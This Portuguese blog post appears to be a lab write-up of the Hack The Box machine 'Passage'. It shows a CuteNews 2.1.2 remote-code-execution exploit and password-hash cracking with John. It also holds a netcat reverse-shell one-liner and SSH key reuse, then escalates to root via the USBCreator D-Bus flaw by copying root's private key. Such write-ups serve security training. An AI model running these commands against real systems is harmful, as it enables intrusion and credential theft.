---
layout: single
title: "Hackthebox write-up: Passage"
namespace: "Hackthebox write-up: Passage"
category: writeup
tags: HackTheBox htb-medium htb-linux
date: 2021-03-06 16:00:00 
header:
   teaser: https://i.imgur.com/Oxk4R89.png
---

![img](https://i.imgur.com/jm8eRRi.png)

Olá pessoal!

A máquina desta semana será Passage, outra máquina Linux classificada como mediana do Hack The Box criada por [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851). 

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
{: .notice--info}

## Enumeração

Iniciado, como de costume, executando um scan rápido com `nmap` para verificar o que se encontra em execução nesta máquina

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.206
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 12:58 -03
Nmap scan report for 10.10.10.206
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
```

### 80/TCP - Serviço HTTP

Acessando a página notado que se trata de um blog criado com **[CuteNews](http://cutephp.com/)** e o primeiro post continha algo bastante interessante, mencionando que Fail2Ban foi recentemente implementado no site. Isso irá nos impedir de utilizar qualquer ferramenta de enumeração que utilize brute force (como dirbuster e outras ferramentas/técnicas relacionadas). 

![image-20210225141945974](https://i.imgur.com/XLBq0J7.png){: .align-center}

Inspecionando o código fonte da página, enquanto buscava por links interessantes, encontrei alguns endereços e-mail, além do domínio **passage.htb**, o qual foi adicionado na sequência no arquivo hosts local. 

```bash
$ curl -L http://10.10.10.206 | grep -Eo 'href="(.*)"' | grep -v 'index.php' | sort -u
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11085    0 11085    0     0  68006      0 --:--:-- --:--:-- --:--:-- 68006
href="CuteNews/libs/css/cosmo.min.css" rel="stylesheet"
href="CuteNews/libs/css/font-awesome.min.css" rel="stylesheet"
href="CuteNews/rss.php"><img src="CuteNews/skins/images/rss_icon.gif" alt="RSS"
href="http://cutephp.com/" title="CuteNews - PHP News Management System" style="font:9px Verdana!important;display:inline!important;visibility:visible!important;color:#003366!important;text-indent: 0px!important;"
href="mailto:kim@example.com"
href="mailto:nadav@passage.htb"
href="mailto:paul@passage.htb"
href="mailto:sid@example.com"
```

Após alguma pesquisa sobre o produto, encontrei a página de administração em `http://passage.htb/CuteNews`, onde pude identificar a versão em execução **2.1.2**. 

![image-20210225154213926](https://i.imgur.com/cYxMtVe.png){: .align-center}

## Acesso inicial

Verificando os exploits existentes para esta versão do produto, encontrei 4 alternativas usando o `searchsploit` onde acabei utilizando a versão **48800**, na qual fiz alguns ajustes posteriormente. 

```
$ searchsploit cutenews 2.1.2
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)          | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                              | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                  | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                | php/webapps/48800.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

A partir da execução deste exploit não apenas pude obter uma execução remota de código mas também um dump dos hashes das senhas do portal. 

```
$ python3 48800.py



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: T6iejum4p0 and password: T6iejum4p0

=======================================================
Sending Payload
=======================================================
signature_key: 93cc9868982b197fd95de590c77cf9b9-T6iejum4p0
signature_dsi: 4afbd01426014d57617027ee835dc2ad
logged in user: T6iejum4p0
============================
Dropping to a SHELL
============================

command > 
```

Crackeando os hashes utilizando John, encontrei a senha **atlanta1**, que pertence ao usuário **paul**, o qual foi identificado após a edição do script Python conforme abaixo. 

```
Enter the URL> http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
```

```bash
$ john -format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes
Created directory: /home/zurc/.john
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
atlanta1         (?)
1g 0:00:00:02 DONE (2021-02-25 16:02) 0.4132g/s 5926Kp/s 5926Kc/s 17794KC/s (454579)..*7¡Vamos!
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

Além da credencial, obtive um shell reverso interativo com a conta **www-data** a partir do envio do payload a seguir: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`. 

## User flag

### Enumeração 

Após executar o script `linpeas.sh`, encontrei alguns itens interessantes:

- Máquina é vulnerável a USBCreator

  ```
  [+] USBCreator
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
  Vulnerable!!
  ```

  Embora seja vulnerável, quando tentei explorá-la conforme explicado [neste link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/), não funcionou corretamente dado a privilégios insuficientes deste usuário.

  ```bash
  www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
  Error: GDBus.Error:org.freedesktop.DBus.Python.dbus.exceptions.DBusException: com.ubuntu.USBCreator.Error.NotAuthorized
  (According to introspection data, you need to pass 'ssb')
  ```

- Observado 2 usuários na máquina, que inicialmente foram listados quando encontrei os endereços de e-mail e, para o usuário Paul, já temos uma possível senha.

  ```
  [+] Users with console
  nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
  paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
  root:x:0:0:root:/root:/bin/bash
  ```

- Permissões para os usuários de console listados, onde **nadav** é o que possui mais privilégios na máquina, sendo inclusive membro do grupo **sudo**. 

  ```
  [+] All users & groups
  uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
  uid=1001(paul) gid=1001(paul) groups=1001(paul)
  ```
  

Primeira coisa a ser testada a seguir foram as credenciais do usuário Paul, que funcionaram com sucesso na primeira tentativa e nos permitiram obter a flag de usuário! :smile:

```bash
www-data@passage:~$ su paul
Password:
paul@passage:~$ cat user.txt
<redacted>
```

## Root flag

Ao obter a conta do usuário *paul*, foi testada novamente a exploração do USB-Creator, porém falhou do mesmo modo que o usuário www-data devido a privilégios insuficientes.

Analisando o diretório raiz do usuário, encontado um par de chaves RSA, a qual está inclusa no arquivo `authorized_keys` para conexão ssh sem credenciais. 

```bash
paul@passage:~/.ssh$ ls -la
total 24
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .
drwxr-x--- 16 paul paul 4096 Feb  5 06:30 ..
-rw-r--r--  1 paul paul  395 Jul 21  2020 authorized_keys
-rw-------  1 paul paul 1679 Jul 21  2020 id_rsa
-rw-r--r--  1 paul paul  395 Jul 21  2020 id_rsa.pub
-rw-r--r--  1 paul paul 1312 Jul 21  2020 known_hosts
```

Dando uma olhada mais de perto no arquivo `id_rsa.pub`, notei que ele foi criado pelo usuário **nadav**. Uma vez que vi esta informação, imediatamente tentei conectar via ssh com esta chave para o usuário nadav e por sorte tivemos sucesso! :smiley:

```bash
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage

$ ssh -i id_rsa nadav@10.10.10.206
Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
Finalmente, como o usuário **nadav**, fiz uma última tentativa da exploração da vulnerabilidade do USBCreator. Desta vez tivemos sucesso, uma vez que este usuário possui diversos privilégios nesta máquina. 

O exploit do USBCreator nos permite copiar um arquivo usando os privilégios de root. Se quiser apenas copiar o arquivo `root.txt` para o diretório `/tmp`, a linha de comando abaixo atende a esta necessidade. 

```bash
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
```

Porém, se quiser um shell interativo com privilégios de root, existem algumas possibilidades que devemos tentar:

- Obter uma cópia do `/etc/shadow`, fazer o unshadow e crackear a senha utilizando John ou Hashcat, o que não funcionou com o dicionário que utilizei;
- Verificar a existência de um arquivo `id_rsa` no perfil do root, assim como sua configuração como uma chave autorizada no arquivo **authorized_keys**, que foi onde obtivemos sucesso e pudemos ver a flag desta conta. 

```bash
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/somefilename true

## Attacker machine
$ scp -i id_rsa nadav@10.10.10.206:/tmp/somefilename .
$ chmod +600 id_rsa
$ ssh -i root@10.10.10.206
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# cat /root/root.txt
<redacted>
```

Espero que tenham gostado. 

Até o próximo post! :smiley:
